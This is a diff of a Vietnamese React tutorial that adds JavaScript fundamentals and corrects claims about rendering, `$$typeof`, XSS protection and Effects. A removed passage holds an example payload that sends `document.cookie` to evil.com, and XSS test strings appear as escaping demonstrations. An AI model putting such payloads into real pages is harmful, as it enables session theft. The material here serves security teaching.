@@ -4,6 +4,75 @@
 
 ---
 
+<!-- content-id: javascript-foundations -->
+## 0. JavaScript Nền Tảng Cho React
+
+React không thay thế JavaScript. Phần này là bộ công cụ tối thiểu để bạn dự đoán được code React trước khi chạy nó.
+
+<!-- content-id: render-snapshot -->
+### 0.1. Binding, scope và snapshot của một lần render
+
+Mỗi lần React gọi function component, biến cục bộ được tạo cho **lần gọi đó**. `count` trong lần render có giá trị `0` không tự biến thành `1` chỉ vì bạn đã gọi `setCount(1)`; React sẽ tạo một lần gọi component sau với binding mới.
+
+```jsx
+function Counter() {
+  const [count, setCount] = useState(0);
+
+  function handleClick() {
+    console.log(count); // snapshot của render đang hiển thị
+    setCount(count + 1);
+    console.log(count); // vẫn là snapshot cũ
+  }
+
+  return <button onClick={handleClick}>{count}</button>;
+}
+```
+
+Hãy đọc handler như một “bức ảnh chụp” của props và state lúc nó được tạo. Đây là nền để hiểu batching, stale closure và dependency.
+
+<!-- content-id: closure-identity -->
+### 0.2. Closure và identity
+
+**Closure** là việc một hàm giữ quyền đọc các biến trong scope nơi nó được tạo. Nó không phải bug. Bug chỉ xuất hiện khi một callback cũ cần dữ liệu mới nhưng bạn không tạo lại callback hoặc không dùng cách đọc dữ liệu mới nhất.
+
+```javascript
+const first = { name: 'Lan' };
+const second = { name: 'Lan' };
+console.log(first === second); // false: hai object khác identity
+
+const same = first;
+console.log(first === same); // true: cùng một object
+```
+
+Object, array và function tạo trong render thường có identity mới. React dùng các phép so sánh identity này cho dependency array, `memo`, `useMemo` và `useCallback`. Đừng tối ưu chỉ vì identity đổi: trước hết hãy đo hoặc chứng minh rằng lần render/tính toán đó thật sự đáng kể.
+
+<!-- content-id: async-order -->
+### 0.3. Promise, event loop và request race
+
+`await` không khóa trang; phần sau `await` sẽ chạy sau khi Promise hoàn thành. Hai request bắt đầu theo thứ tự A rồi B có thể hoàn thành theo thứ tự B rồi A. Vì vậy UI không nên giả định “request bắt đầu sau sẽ luôn về sau”.
+
+```javascript
+const a = fetch('/api/users/1');
+const b = fetch('/api/users/2');
+// b có thể resolve trước a.
+```
+
+Với UI, hãy dùng một trong các chiến lược rõ ràng: `AbortController`, request ID, cache theo key, hoặc bỏ qua kết quả khi nó không còn đại diện cho màn hình hiện tại.
+
+<!-- content-id: immutable-update -->
+### 0.4. Immutable update và giá trị suy ra
+
+Không sửa trực tiếp object/array đang nằm trong state. Hãy tạo giá trị mới cho phần đổi để dữ liệu cũ vẫn có ý nghĩa và React có thể so sánh identity.
+
+```jsx
+setTodos(previous =>
+  previous.map(todo => todo.id === id ? { ...todo, done: !todo.done } : todo)
+);
+```
+
+Nếu có thể tính một giá trị từ props/state trong lúc render, đừng lưu thêm một state thứ hai cho nó. Ví dụ, tiêu đề chương đang mở có thể suy ra từ `currentChapterId` và danh sách chương; lưu cả `chapterTitle` tạo hai nguồn sự thật có thể lệch nhau.
+
+<!-- content-id: react-context -->
 ## 1. Bối Cảnh: Vì Sao React Ra Đời
 
 ### 1.1. Thời kỳ Server-Side Rendering thuần túy
@@ -88,12 +157,13 @@ Ngoài bảo mật và hiệu năng, cách quản lý dữ liệu-giao diện ki
 
 ### 1.4. Giải pháp cốt lõi: mô phỏng giao diện trong bộ nhớ
 
-React (và các framework cùng thời) giải quyết đồng thời 3 vấn đề trên bằng một ý tưởng: **thay vì thao tác trực tiếp lên DOM thật, hãy tạo ra một bản mô phỏng giao diện (Virtual DOM) trong bộ nhớ JavaScript.** Khi dữ liệu đổi, hệ thống chỉ cần tính toán **phần khác biệt** rồi áp đúng phần đó lên DOM thật — vừa nhanh hơn, vừa tránh chèn HTML thô (giải quyết luôn vấn đề XSS ở tầng framework), vừa buộc code phải theo một mô hình rõ ràng (UI luôn là hàm của state) nên dễ bảo trì hơn.
+React giúp tổ chức UI bằng cách mô tả giao diện từ dữ liệu, rồi React DOM điều phối việc cập nhật DOM. Virtual DOM/reconciliation là một phần của cách triển khai đó, không phải lời hứa rằng React luôn nhanh hơn DOM trực tiếp hay tự giải quyết XSS. JSX escape giá trị text theo mặc định; an toàn vẫn phụ thuộc vào ngữ cảnh đầu ra và việc không đưa dữ liệu chưa tin cậy vào API chèn HTML.
 
 Ba động lực này — **bảo mật, hiệu năng, khả năng bảo trì** — chính là ba trụ cột giải thích cho gần như mọi quyết định thiết kế của React mà bạn sẽ thấy xuyên suốt tài liệu này.
 
 ---
 
+<!-- content-id: react-design -->
 ## 2. Triết Lý Thiết Kế Của React
 
 React không chỉ là một thư viện, nó là một **cách tư duy**. Ba trụ cột: Declarative Programming, Component-based Architecture, One-way Data Flow.
@@ -184,7 +254,7 @@ function UserCard({ user }) {
 |----------|-------|-------|
 | Ai sở hữu | Component tự quản lý (nội bộ) | Được truyền từ component cha |
 | Thay đổi được không | Có — qua `setState` / `useState` setter | Không — read-only, chỉ cha mới đổi được |
-| Khi đổi thì sao | Component re-render | Component re-render (nếu giá trị thật sự khác) |
+| Khi đổi thì sao | React lên lịch một lần render mới cho component sở hữu state | Cha render lại có thể khiến React gọi lại component con; điều đó khác với việc DOM chắc chắn đổi |
 | Ví dụ điển hình | Nội dung ô input đang gõ, menu mở/đóng, tab đang chọn | `user`, `title`, `onClick`, `disabled` được cha truyền xuống |
 | Ai chịu trách nhiệm khi cần đổi | Chính component đó | Component cha — con chỉ "xin" qua callback |
 
@@ -210,14 +280,16 @@ function Parent() {
 }
 
 function Child({ count }) {
-  // Child KHÔNG được viết: count = 5; → sẽ lỗi hoặc bị React cảnh báo
+  // Không dùng props làm nơi lưu state: giá trị của `count` đến từ Parent.
   return <p>Child nhận props: {count}</p>;
 }
 
 export default Parent;
 ```
 
-**Thử nghiệm để hiểu rõ tại sao props là read-only:** nếu bạn cố tình viết `count = count + 1;` bên trong `Child`, React sẽ không báo lỗi runtime ngay (vì JS cho phép gán lại biến cục bộ), nhưng lần render tiếp theo giá trị đó sẽ **bị Parent ghi đè lại** — vì props luôn được đồng bộ lại từ component cha ở mỗi lần render. Đây là minh chứng thực tế cho việc "props chỉ đọc": bạn *có thể* gán tạm, nhưng nó không có ý nghĩa gì, vì nguồn sự thật (source of truth) nằm ở Parent, không nằm ở Child.
+**Phân biệt ba việc rất dễ lẫn:** `count = count + 1` chỉ gán lại **binding JavaScript cục bộ** trong lần gọi hàm hiện tại; sửa `props.user.name` là thay đổi một object mà component khác sở hữu (và nên tránh); còn `setCount(...)` yêu cầu React cập nhật state. Chỉ cách cuối làm React lên lịch render mới. Props là đầu vào read-only theo thiết kế: hãy coi chúng là dữ liệu để đọc, không phải chỗ để cất hoặc sửa trạng thái.
+
+Khi cha render lại, React có thể gọi lại `Child` ngay cả khi `count` có cùng giá trị. `React.memo` có thể bỏ qua lần gọi lại đó khi props không đổi theo phép so sánh nông, nhưng state hoặc context của chính `Child` vẫn có thể làm nó cập nhật. Và dù component được gọi lại, React chỉ thay đổi DOM ở commit nếu kết quả UI cần thay đổi.
 
 ### 2.4. Luồng dữ liệu một chiều (One-way Data Flow)
 
@@ -242,9 +314,10 @@ function Child({ onIncrease }) {
 }
 ```
 
-**Ví dụ minh họa "vì sao một chiều lại dễ debug hơn hai chiều":** hãy tưởng tượng nếu React cho phép data flow 2 chiều tự do (child có thể tự sửa state của parent trực tiếp, giống binding 2 chiều kiểu Angular cũ/Vue v2). Khi bug xảy ra ("tại sao count lại là 7 mà không phải 5?"), bạn phải lần theo **mọi nơi** có thể sửa `count` — có thể là 5 component khác nhau ở 5 chỗ trong cây UI. Với one-way data flow, chỉ có **đúng một nơi** sở hữu và sửa `count` (nơi gọi `setCount`), nên khi debug bạn chỉ cần tìm đúng 1 điểm — đây gọi là **single source of truth**.
+**Ví dụ minh họa "vì sao một chiều lại dễ debug hơn":** state vẫn có một chủ sở hữu là `Parent`. Con không nhận được state để tự sửa; nó phát ra một yêu cầu có tên theo nghiệp vụ (`onIncrease`), rồi `Parent` quyết định có gọi `setCount` hay không. Khi bug xảy ra, ta lần từ callback về nơi sở hữu state và lần giá trị mới lại đi xuống qua props. Đó là luồng một chiều; không phải quy tắc rằng chỉ một component duy nhất trong ứng dụng được gọi setter.
 
-> **Bài tập tự kiểm chứng:** thử code lại ví dụ Counter, nhưng cố tình để `Child` nhận nguyên object `{ count, setCount }` và tự gọi `setCount(999)` bên trong Child. Kỹ thuật này *chạy được* (không phải React cấm), nhưng nó phá vỡ nguyên tắc one-way — và bạn sẽ thấy code khó theo dõi hơn hẳn khi ứng dụng có thêm vài component nữa cùng thao túng `count`. Đây là lý do dù React không ép buộc bằng công cụ, cộng đồng vẫn coi one-way data flow là quy ước bắt buộc.
+> **Bài tập tự kiểm chứng:** thử để `Child` nhận `setCount` và gọi `setCount(999)`. Cách này vẫn hợp lệ: state vẫn thuộc `Parent`, và giá trị mới vẫn đi xuống bằng props. Trong ứng dụng lớn, callback theo ý nghĩa nghiệp vụ (`onIncrease`, `onReset`) thường dễ tìm và dễ giới hạn quyền hơn setter tổng quát.
+<!-- content-id: jsx-security -->
 ## 3. Bản Chất Của JSX Và Quá Trình Biên Dịch
 
 ### 3.1. Trình duyệt không hề biết JSX là gì
@@ -343,164 +416,71 @@ console.log(element);
 ```
 Mở Console, bạn sẽ thấy đúng object này hiện ra — không phải chuỗi HTML `"<h1 class=..."`, mà là object JS với `type`, `props`.
 
-### 3.5. `$$typeof: Symbol(react.element)` — "con dấu" chống giả mạo
+<!-- content-id: jsx-element-safety -->
+### 3.5. React element, `$$typeof` và ranh giới an toàn
 
-####  Vấn đề đặt ra: React cần nhận biết element "thật" như thế nào?
-
-Khi React nhận được một object để render, nó cần trả lời: *"Object này có phải do chính React tạo ra, hay ai đó đang cố tình nhét vào?"*
-
-Để giải quyết, React tự động gắn thêm một thuộc tính đặc biệt vào **mọi** React element:
+JSX tạo một object mô tả UI. Trong object này React có một giá trị `$$typeof` dùng để nhận diện **định dạng element** khi xử lý nội bộ:
 
 ```javascript
-// Khi bạn viết JSX:
 const element = <h1>Hello</h1>;
 
-// React tạo ra object này (đã đơn giản hóa):
+// Dạng đơn giản hóa; đừng phụ thuộc vào cấu trúc implementation này.
 {
-  $$typeof: Symbol.for('react.element'),  // ← "con dấu xác thực"
+  $$typeof: Symbol.for('react.element'),
   type: 'h1',
-  props: { children: 'Hello' },
-  key: null,
-  ref: null
+  props: { children: 'Hello' }
 }
 ```
 
-`$$typeof` đóng vai trò như **con dấu xác thực chính thức** — React dựa vào nó để biết object này thực sự do `createElement`/`_jsx` sinh ra, không phải object ngẫu nhiên từ nguồn khác.
+`$$typeof` không phải chữ ký xác nhận element “đến từ React” và không phải cơ chế bảo mật. JSON thông thường không mang được Symbol thật, nhưng mã JavaScript trong cùng môi trường vẫn có thể gọi `Symbol.for` với cùng khóa. Vì vậy, không dùng chi tiết này để quyết định dữ liệu nào đáng tin.
 
----
+Ba trường hợp người mới cần phân biệt là:
 
-####  Tại sao Symbol không thể bị làm giả?
+| Giá trị đặt trong JSX | React xử lý như thế nào | Cách dùng đúng |
+|---|---|---|
+| Chuỗi hoặc số | Hiển thị thành text | `<p>{user.name}</p>` |
+| React element hợp lệ | Mô tả một phần UI | `<Card />` hoặc `<div />` |
+| Plain object dữ liệu | Thường gây lỗi nếu đặt trực tiếp làm child | Chọn trường cần hiển thị: `{user.name}` |
 
-`Symbol` trong JavaScript có một đặc tính **duy nhất và tuyệt đối**: **không thể serialize qua JSON**.
+#### `$$typeof` không thay thế phòng chống XSS
 
-```javascript
-// Thử JSON.stringify một Symbol:
-const obj = { key: Symbol.for('react.element'), value: 42 };
-JSON.stringify(obj);
-// → '{"value":42}'   ← Symbol bị BỎ QUA hoàn toàn, không xuất hiện!
+React escape giá trị text trong JSX theo mặc định:
 
-// Thử JSON.parse ngược lại — không thể tạo lại:
-JSON.parse('{"$$typeof": "Symbol.for(\'react.element\')"}');
-// → { $$typeof: "Symbol.for('react.element')" }  ← chỉ là chuỗi text, không phải Symbol!
+```jsx
+const userInput = "<img src=x onerror=alert(1)>";
+return <div>{userInput}</div>; // hiển thị text, không biến nó thành HTML
 ```
 
-Điều này tạo ra một "bức tường" tự nhiên: **bất kỳ dữ liệu nào đến từ mạng (JSON) đều không thể mang theo Symbol thật**.
+Lớp bảo vệ này không áp dụng nếu dữ liệu chưa tin cậy được đưa vào `dangerouslySetInnerHTML`, `innerHTML`, URL hoặc API DOM khác có ngữ cảnh riêng. `dangerouslySetInnerHTML` chỉ dành cho markup mà sản phẩm thực sự cần hiển thị. Khi dùng nó, hãy sanitize theo đúng ngữ cảnh, giữ thư viện/cấu hình cập nhật và bổ sung CSP; không có một lời hứa “an toàn 100%” chỉ từ một hàm sanitize.
 
----
+```jsx
+import DOMPurify from 'dompurify';
 
-####  Kịch bản tấn công thực tế: Object injection
-
-Giả sử server bị tấn công và trả về JSON độc hại có dạng một React element:
-
-```json
-{
-  "type": "script",
-  "props": { "children": "fetch('https://evil.com?c='+document.cookie)" }
+function RichText({ html }) {
+  const safeHtml = DOMPurify.sanitize(html);
+  return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />;
 }
 ```
 
-**Nếu không có `$$typeof`:** React có thể bị lừa tưởng đây là element hợp lệ → render `<script>` thật → XSS.
-
-**Với `$$typeof`:** Object từ JSON này **không có** `$$typeof: Symbol(react.element)` (vì Symbol không đi qua JSON được). Khi React kiểm tra, nó phát hiện ngay đây không phải element hợp lệ → **từ chối render như UI**, chỉ hiển thị như text vô hại.
-
-```
-┌──────────────────────────────────────────────────────────────┐
-│                      Luồng kiểm tra của React                │
-│                                                              │
-│  Nguồn gốc          Object nhận được        Kết quả         │
-│  ──────────         ────────────────        ────────         │
-│                     { type, props,                           │
-│  Server JSON   →      (thiếu $$typeof) }  →  Từ chối      │
-│  (bị hack)          Kiểm tra: không có        render như text│
-│                     Symbol → không hợp lệ                   │
-│                                                              │
-│                     { $$typeof: Symbol,                      │
-│  createElement() →    type, props }       →  Cho phép     │
-│  (code của bạn)     Kiểm tra: có Symbol      render bình    │
-│                     → hợp lệ                thường          │
-└──────────────────────────────────────────────────────────────┘
-```
-
 ---
 
-####  Lưu ý quan trọng: `$$typeof` ≠ chống XSS
-
-Đây là điểm dễ nhầm lẫn nhất. Hai cơ chế này **hoàn toàn khác nhau**:
-
-| Cơ chế | Bảo vệ chống lại | Cách hoạt động |
-|--------|-----------------|----------------|
-| `$$typeof` | Object injection (element giả mạo) | Kiểm tra con dấu Symbol khi React duyệt cây |
-| Auto-escape | XSS từ nội dung người dùng | Dùng `textContent` thay vì `innerHTML` |
-
-**Auto-escape** mới là lớp bảo vệ XSS thực sự:
-
-```jsx
-// Người dùng nhập vào ô tìm kiếm:
-const userInput = "<script>alert('hacked')</script>";
-
-// Bạn render bình thường:
-return <div>{userInput}</div>;
-//  React gán bằng textContent → hiển thị đúng nguyên văn như text
-//  KHÔNG tạo thẻ <script> thật → an toàn tuyệt đối
-```
-
-Trong DOM thật, React tương đương với:
-```javascript
-div.textContent = userInput;  // ← an toàn
-// chứ KHÔNG phải:
-div.innerHTML = userInput;    // ← nguy hiểm
-```
-
-**Nhưng nếu bạn tự tay bypass:**
-
-```jsx
-//  Tắt bảo vệ mặc định — NGUY HIỂM nếu không sanitize
-<div dangerouslySetInnerHTML={{ __html: userInput }} />
-```
-
-Cái tên `dangerouslySetInnerHTML` không phải ngẫu nhiên — React đặt tên dài và có chữ **"dangerously"** để buộc developer phải suy nghĩ kỹ trước khi dùng. Khi dùng API này, React gọi `innerHTML` thật → `<script>` thực thi → XSS quay lại y hệt thời ghép chuỗi HTML server-side.
-
-> **Quy tắc vàng:** Chỉ dùng `dangerouslySetInnerHTML` khi bạn **chắc chắn 100%** nội dung đã được sanitize, ví dụ qua thư viện [DOMPurify](https://github.com/cure53/DOMPurify):
-> ```javascript
-> import DOMPurify from 'dompurify';
-> <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
-> ```
-
----
-
-####  Tóm tắt: 3 lớp bảo vệ của React
-
-```
-Mối đe dọa                  Lớp bảo vệ                 Cơ chế kỹ thuật
-────────────────────────────────────────────────────────────────────────
-Object injection         →  $$typeof Symbol         →  Kiểm tra Symbol trước khi render
-(server trả object lạ)      (con dấu xác thực)
-
-XSS từ nội dung          →  Auto-escape             →  textContent thay vì innerHTML
-(user input độc hại)        (mặc định bật)
-
-Bypass có chủ ý          →  Tên API cảnh báo        →  "dangerously..." + dùng DOMPurify
-                             + sanitize thủ công         để lọc HTML độc hại
-```
-
----
-
+<!-- content-id: render-commit -->
 ## 4. Công Nghệ Điều Phối Hiệu Năng: Virtual DOM và Reconciliation
 
 ### 4.1. Vì sao thao tác trực tiếp lên Real DOM lại đắt đỏ
 
-Nếu bạn đổi màu một nút bấm bằng thao tác DOM trực tiếp trên quy mô lớn (hàng trăm phần tử), trình duyệt có thể phải tính lại **layout** (kích thước, vị trí của các phần tử xung quanh — gọi là reflow) và **repaint** (vẽ lại pixel) toàn bộ vùng ảnh hưởng. Đây là những thao tác tốn tài nguyên CPU/GPU thực sự, không phải "cảm giác chậm" mơ hồ.
+Thao tác DOM có thể kéo theo các loại công việc khác nhau: tính style, layout, paint và composite. Đổi `color` thường cần paint nhưng không nhất thiết layout; thêm node có thể ảnh hưởng vị trí các node khác. Đây là những công việc tốn tài nguyên thực sự, nhưng phải đo trong ngữ cảnh CSS và trình duyệt cụ thể.
 
-**Ví dụ đo lường cụ thể (bạn có thể tự thử trong DevTools tab Performance):** tạo 1000 `<div>` trong một trang, rồi trong vòng lặp, đổi `style.color` từng phần tử một cách trực tiếp. Ghi lại thời gian bằng `performance.now()` trước và sau vòng lặp — bạn sẽ thấy con số vài chục đến vài trăm mili-giây tùy máy, đủ để gây giật lag nếu lặp lại 60 lần/giây (tương đương animate mượt).
+**Cách đo đúng:** tạo tình huống cụ thể, mở DevTools Performance, ghi thao tác và kiểm tra các mục Style/Layout/Paint. `performance.now()` quanh một vòng gán style chưa bao gồm đầy đủ phần vẽ có thể bị trình duyệt hoãn; khi báo kết quả hãy ghi máy, dữ liệu, thao tác và metric.
 
 ### 4.2. Cơ chế Virtual DOM — 4 giai đoạn
 
 Virtual DOM (VDOM) là một cây object JS mô phỏng lại cấu trúc DOM thật, tồn tại hoàn toàn **trong bộ nhớ JavaScript** (không chạm trình duyệt). Quá trình đồng bộ, gọi là **Reconciliation**, gồm 4 bước:
 
-1. **First Paint:** khi app khởi chạy, React dựng cây VDOM đầu tiên và xuất ra DOM thật tương ứng — đây là lần duy nhất "toàn bộ" được vẽ.
-2. **Trigger & Re-render:** khi state đổi (ví dụ `setCount`), hàm component chứa state đó chạy lại. Bước này **chưa chạm** DOM trình duyệt — React chỉ âm thầm tính ra một cây VDOM mới trong bộ nhớ.
-3. **Diffing:** React đặt cây VDOM mới cạnh cây VDOM cũ, so sánh để tìm ra chính xác điểm khác biệt.
-4. **Commit:** React đóng gói các khác biệt tìm được thành một "bản vá" (patch) tối thiểu, rồi áp trực tiếp đúng phần đó lên DOM thật. Phần còn lại của trang **không hề bị động tới**.
+1. **Render đầu tiên:** React tính UI ban đầu rồi commit các host node cần thiết. Trình duyệt sau đó thực hiện công việc style, layout, paint và composite khi cần; không nên gộp tất cả thành một khái niệm "vẽ".
+2. **Trigger & re-render:** khi state đổi, React có thể gọi lại component chứa state để tính UI kế tiếp. Đây là pha render, chưa phải bằng chứng DOM đã đổi.
+3. **Reconciliation:** React đối chiếu mô tả UI mới với mô tả trước đó theo các quy tắc nhận diện của nó.
+4. **Commit:** React áp các thay đổi cần thiết lên renderer (với React DOM là DOM). Sau đó trình duyệt quyết định phần style/layout/paint nào cần làm. React cố giảm thay đổi thừa nhưng không hứa mọi cập nhật luôn là "patch tối thiểu".
 
 **Ví dụ cụ thể để thấy sự khác biệt:** giả sử bạn có danh sách 1000 tin nhắn (giống ví dụ ở phần 1.2), và chỉ 1 tin nhắn mới được thêm vào cuối mảng `messages`. Với React:
 
@@ -514,15 +494,16 @@ function ChatList({ messages }) {
 }
 ```
 
-Khi `messages` có thêm 1 phần tử, component chạy lại (bước 2), tạo ra cây VDOM mới có 1001 node. Ở bước Diffing, React so sánh và nhận ra 1000 node đầu **giống hệt** node cũ (cùng `key`, cùng nội dung) — chỉ có 1 node cuối là mới. Ở bước Commit, React chỉ tạo **đúng 1 DOM node mới** và chèn vào cuối danh sách thật — 1000 node còn lại của DOM thật hoàn toàn không bị đụng tới, không reflow, không repaint lại.
+Khi `messages` có thêm 1 phần tử, component có thể chạy lại và React nhận diện phần tử mới ở cuối nhờ key ổn định. Trong trường hợp đơn giản này, commit thường chỉ cần chèn node mới. Tuy nhiên số DOM mutation và phần việc layout/paint phụ thuộc vào CSS, cấu trúc và trình duyệt; đừng suy ra "không reflow/repaint" chỉ từ việc 1 item được thêm.
 
-### 4.3. Thuật toán Diffing: Heuristic O(n) thay vì O(n³)
+<!-- content-id: reconciliation-identity -->
+### 4.3. Reconciliation: heuristic nhận diện theo type và key
 
 ####  Tại sao không so sánh cây tổng quát?
 
-So sánh 2 cây tổng quát trong khoa học máy tính có độ phức tạp lý thuyết lên tới **O(n³)** — nghĩa là với 1000 node, máy cần thực hiện **1 tỷ phép so sánh**. Điều này hoàn toàn không thể chấp nhận với UI thay đổi liên tục.
+So sánh cây tổng quát tối ưu là bài toán đắt hơn nhiều so với cách một UI framework thường cần xử lý. Tài liệu reconciliation lịch sử của React mô tả một heuristic có độ phức tạp gần tuyến tính theo số phần tử trong mô hình đó.
 
-React chọn hướng thực dụng: đánh đổi tính chính xác tuyệt đối lấy **hiệu năng gần O(n)** bằng cách dùng **2 giả định heuristic** — những quy tắc đúng với ~99% trường hợp thực tế.
+React chọn hướng thực dụng: dùng các quy tắc nhận diện như type và key. Đây không phải cam kết thời gian chạy tổng thể của mọi ứng dụng: chính code trong component vẫn có thể tốn kém.
 
 ---
 
@@ -696,7 +677,7 @@ Fiber viết lại toàn bộ reconciler, biến mỗi node thành một **Fiber
 }
 ```
 
-Nhờ cấu trúc liên kết này, React có thể **dừng tại bất kỳ node nào** và tiếp tục sau:
+Nhờ cấu trúc liên kết này, React có thể chia công việc render thành các đơn vị để scheduler có cơ hội nhường quyền tại các điểm phù hợp:
 
 ```
 Main thread timeline (React Fiber):
@@ -722,10 +703,11 @@ Fiber chia công việc render thành các **chunk nhỏ**. Sau mỗi chunk, Rea
 Không có time slicing (Stack):       Có time slicing (Fiber):
 ─────────────────────────────         ──────────────────────────────────────
 [======= render (100ms) =======]      [chunk][click!][chunk][chunk][paint]
-[click bị delay 100ms!]               [click phản hồi ngay lập tức ]
+[click có thể bị chậm]                [có cơ hội xử lý click sớm hơn]
 ```
 
-Đây là nền tảng cho **Concurrent Rendering** ở React 18+, cho phép React làm nhiều việc song song: render nền ở mức thấp ưu tiên trong khi vẫn giữ UI phản hồi mượt mà với tương tác người dùng.
+Đây là nền tảng cho **Concurrent Rendering** ở React 18+: React có thể bắt đầu render cập nhật ưu tiên thấp, nhường cho việc ưu tiên hơn, rồi tiếp tục, làm lại hoặc bỏ kết quả render trước commit. Nó không tự biến một hàm JavaScript nặng thành nhiều luồng CPU, không phải mọi update đều được time-slice, và không bảo đảm click luôn phản hồi tức thì.
+<!-- content-id: component-lifecycle -->
 ## 5. Vòng Đời Component
 
 ### 5.1. Ba giai đoạn vòng đời
@@ -755,8 +737,8 @@ Mỗi component từ lúc xuất hiện đến lúc bị gỡ bỏ đều trải
               └─────────────────────┘
 ```
 
-- **Mounting:** component lần đầu xuất hiện — React tạo DOM node, chạy effect sau khi vẽ xong.
-- **Updating:** state hoặc props thay đổi — component chạy lại hàm render, tính cây VDOM mới, diff, commit patch lên DOM.
+- **Mounting:** component lần đầu xuất hiện — React tạo DOM node và chạy Effect sau commit. Thời điểm tương quan với paint phụ thuộc loại Effect và trình duyệt.
+- **Updating:** state hoặc props thay đổi — React có thể gọi lại component để tính UI kế tiếp, reconciliation đối chiếu kết quả và commit thay đổi cần thiết lên renderer.
 - **Unmounting:** component bị gỡ khỏi DOM — React chạy hàm cleanup để dọn dẹp (hủy timer, hủy subscription, abort request...).
 
 ---
@@ -901,6 +883,7 @@ Class Component vẫn được React hỗ trợ, nhưng Hooks đã là chuẩn m
 
 ---
 
+<!-- content-id: hooks -->
 ## 6. Hooks — Từng Hook Chi Tiết Và Cách Áp Dụng
 
 React cung cấp một bộ hook built-in, mỗi hook giải quyết một nhóm vấn đề cụ thể:
@@ -970,7 +953,7 @@ Dùng `useReducer` khi state có nhiều nhánh logic liên quan với nhau (tr�
 function UserProfile({ userId }) {
   // Phải khai báo RIÊNG LẺ từng mảnh state liên quan đến CÙNG một việc (gọi API)
   const [data, setData] = useState(null);
-  const [isLoading, setIsLoading] = useState(false);
+  const [isLoading, setIsLoading] = useState(true);
   const [error, setError] = useState(null);
 
   useEffect(() => {
@@ -978,7 +961,10 @@ function UserProfile({ userId }) {
     setError(null);
 
     fetch(`/api/users/${userId}`)
-      .then(res => res.json())
+      .then(res => {
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        return res.json();
+      })
       .then(json => {
         setData(json);       // set 1: thành công
         setIsLoading(false); // set 2: phải nhớ tắt loading
@@ -1019,13 +1005,16 @@ function reducer(state, action) {
 
 function UserProfile({ userId }) {
   const [state, dispatch] = useReducer(reducer, {
-    data: null, isLoading: false, error: null
+    data: null, isLoading: true, error: null
   });
 
   useEffect(() => {
     dispatch({ type: 'FETCH_START' });
     fetch(`/api/users/${userId}`)
-      .then(res => res.json())
+      .then(res => {
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        return res.json();
+      })
       .then(json => dispatch({ type: 'FETCH_SUCCESS', payload: json }))
       .catch(err => dispatch({ type: 'FETCH_ERROR', payload: err }));
   }, [userId]);
@@ -1077,11 +1066,13 @@ useEffect(() => {
 }, [dependencies]);
 ```
 
+Effect dùng để **đồng bộ component với một hệ thống bên ngoài** như network, subscription, timer hoặc API trình duyệt. Nó chỉ chạy cho UI đã commit. Không dùng Effect chỉ để tính một giá trị có thể suy ra ngay khi render.
+
 **3 cách khai báo dependency và ý nghĩa khác nhau:**
 
 ```jsx
 useEffect(() => { /* ... */ });          // chạy sau MỌI lần render
-useEffect(() => { /* ... */ }, []);      // chỉ chạy 1 lần, sau lần mount đầu tiên
+useEffect(() => { /* ... */ }, []);      // setup sau mount; cleanup khi unmount (và có thể setup/cleanup thêm trong Strict Mode development)
 useEffect(() => { /* ... */ }, [userId]); // chạy lại mỗi khi userId đổi
 ```
 
@@ -1095,12 +1086,15 @@ function UserProfile({ userId }) {
     let cancelled = false;
 
     fetch(`/api/users/${userId}`)
-      .then(res => res.json())
+      .then(res => {
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        return res.json();
+      })
       .then(data => {
         if (!cancelled) setUser(data); // tránh set state nếu component đã unmount
       });
 
-    return () => { cancelled = true; }; // cleanup: đánh dấu hủy nếu userId đổi tiếp hoặc unmount
+    return () => { cancelled = true; }; // bỏ qua kết quả cũ nếu userId đổi tiếp hoặc unmount
   }, [userId]);
 
   return user ? <div>{user.name}</div> : <div>Đang tải...</div>;
@@ -1124,15 +1118,16 @@ useEffect(() => {
 }, [userId]); // ← thêm vào dependency
 ```
 
-**Sai lầm 2 — Object/Array trong dependency gây infinite loop:**
+**Sai lầm 2 — Object/Array trong dependency *có thể* gây vòng lặp:**
 ```jsx
 // SAI: options = {} tạo object MỚI mỗi lần render → dependency luôn "đổi"
 function MyComponent() {
+  const [, setLastLoadedAt] = useState(null);
   const options = { timeout: 3000 }; // ← tạo mới mỗi lần render!
 
   useEffect(() => {
-    fetchData(options);
-  }, [options]); // ← infinite loop: effect chạy → re-render → options mới → effect chạy...
+    fetchData(options).then(() => setLastLoadedAt(Date.now()));
+  }, [options]); // effect cập nhật state → render → options mới → effect chạy lại
 }
 
 // ĐÚNG: dùng useMemo hoặc đưa object ra ngoài component
@@ -1146,7 +1141,7 @@ function MyComponent() {
 
 **Sai lầm 3 — Effect chạy 2 lần trong Strict Mode (React 18):**
 
-Trong development với Strict Mode, React cố tình mount → unmount → mount lại mỗi component để phát hiện side effect không có cleanup. Đây là **hành vi cố ý**, không phải bug — nếu bạn thấy API bị gọi 2 lần khi dev, đó là dấu hiệu effect của bạn thiếu cleanup function đúng cách. Production không bị ảnh hưởng.
+Trong development với Strict Mode, React có thể chạy thêm một chu kỳ setup → cleanup → setup để kiểm tra Effect. Đây là **hành vi cố ý**, không phải bug. Hai request không tự chứng minh rằng bạn quên cleanup: cleanup có thể hủy request hoặc bỏ qua kết quả cũ, nhưng chiến lược cache/deduplication mới quyết định có request mạng thứ hai hay không.
 
 ```jsx
 // Đảm bảo luôn có cleanup để Strict Mode không gây vấn đề:
@@ -1157,6 +1152,7 @@ useEffect(() => {
 }, [url]);
 ```
 
+<!-- content-id: stale-closure -->
 ### 6.4. Stale Closure — lỗi kinh điển của người mới học Hooks
 
 **Stale closure** xảy ra khi hàm bên trong `useEffect` (hoặc bất kỳ callback nào) "giữ lại" giá trị state tại **thời điểm nó được tạo ra**, và không tự cập nhật theo state mới dù state đã đổi.
@@ -1174,7 +1170,7 @@ function Counter() {
     }, 1000);
 
     return () => clearInterval(id);
-  }, []); // mảng rỗng — effect chỉ chạy 1 LẦN DUY NHẤT
+}, []); // đăng ký interval từ snapshot lúc mount
 
   return <div>{count}</div>;
 }
@@ -1182,7 +1178,7 @@ function Counter() {
 
 **Kết quả khi chạy:** `count` chỉ tăng lên 1 rồi đứng yên mãi mãi (không phải tăng đều mỗi giây), và `console.log` luôn in ra `0`.
 
